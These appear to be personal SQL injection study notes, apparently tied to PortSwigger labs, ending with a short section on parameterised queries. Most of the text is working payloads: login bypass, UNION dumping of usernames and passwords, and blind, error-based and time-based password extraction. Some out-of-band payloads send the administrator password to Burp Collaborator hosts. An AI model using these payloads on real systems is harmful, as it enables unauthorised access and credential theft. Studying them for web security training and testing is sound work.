# SQL Injection

[**Cheat Sheet**](https://portswigger.net/web-security/sql-injection/cheat-sheet)

**Warning**
Be careful with `OR 1=1` - It's common for applications to use data from a single request in multiple different queries. If your condition reaches an UPDATE or DELETE statement, for example, it can result in an accidental loss of data.

## Detection

- `'` check for errors and anomalies
- `-- ` after first argument, does second argument get ignored (mysql requires a space after `--`)
- Time delay conditions
- OAST (Out-of-band Application Security Testing); trigger an out-of-band network interaction (DNS lookup, HTTP request, or other callback) to a server the tester controls.

## Login Bypass

- `administrator'--` commenet out password

## UNION Based SQLi

### Determine number of columns

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

or

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

**Tip** Oracle requires a FROM keyword with every SELECT clause.
```sql
' UNION SELECT NULL FROM DUAL--
```

### Finding useful columns

```sql
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

### Retrieving data with UNION based SQLi

- For Muliple available useable columns
```sql
' UNION SELECT username, password,Null FROM users--
```
- For multiple values in the same column
```sql
' UNION SELECT username || '~' || password FROM users--
```

### Database Enumeration

- `' UNION SELECT @@version--` for database version
- `SELECT * FROM information_schema.tables` for available tables
- `SELECT * FROM information_schema.columns WHERE table_name = 'Users'` for columns in a database


## BLIND Based 

### Detection

- Look for differences in error messages (or lack of) when appending TRUE/FALSE conditions
```sql
' AND '1'='1
' AND '1'='2
```

### Exploitation


- `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a` - to calculate length
- Test for a specific char
```sql
' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) < 'm
' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 'm
```

## Error based

### Detection

- Check for different error messages when syntax is correct `''` vs not `'`
```sql
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a -- Returns 1/0
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a -- Returns True (a=a)
```

### Exploiting

- FROM > CONDITION > SELECT
- mysql:
```sql
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```
- oracle:
```sql
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' -- get password length
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' -- get char
```

## ERROR Based

- `CAST((SELECT example_column FROM example_table) AS int)` cast as string as int to cause string value to be displayed in the error message
- `TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--` char limited query to show username of first entry
- `TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--` same but for password
- `TrackingId=4yb0YyXSCJI1ZdsO'||(select password::int from users)--` even more efficient version

## Time Based

### Detection

- `'; IF (1=2) WAITFOR DELAY '0:0:10'--` no time delay triggered
- `'; IF (1=1) WAITFOR DELAY '0:0:10'--` time delay triggered

### Exploitation

- If query returns 1 (true) trigger delay (may need to URL encode `;` if thats the terminator)
```sql
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```
- Postgres
```sql
'%3BSELECT CASE WHEN ((SELECT COUNT(username) FROM users WHERE username = 'administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```
- or
```sql
'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

## OAST (Out-of-band Application Security Testing) Based

### Detection

- Send to burp collaborator from Microsoft SQL Server
```sql
'; exec master..xp_dirtree '//244gzf8zgd8ii1b12l8jgtc0rrxil89x.oastify.com/a'--
```
- URL encoded union Microsoft SQL Server query
```sql
'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```

### Exploitation

- Select the admin password and append the burp collaborator address
```sql
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```
- URL encoded Microsoft SQL server query
```sql
x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.ej1sernbvpnuxdqdhxnvv5rc63cv0qof.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
```

## Other

- Bypassing `SELECT` key word filter one a server that recieve SQL queries via XML
```xml
<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x55;NION &#x53;ELECT password &#x46;ROM users &#x57;HERE username = &#x27;administrator&#x27;</storeId>
</stockCheck>
```
- Second order effects where SQLi is prevented at input but not at use

## SQLi Prevent

- Use paramatised queries instead of string concatenation
- Vulnerable:
```js
String query = "SELECT * FROM products WHERE category = '"+ input + "'";
Statement statement = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);
```
- Safe:
```js
PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();
```
- Paramatised can't be used for column names or ORDER BY. When accepting user supplied input for these other approaches are required:
    - Whitelisting permitted input values
    - Using different logic to deliver the required behavior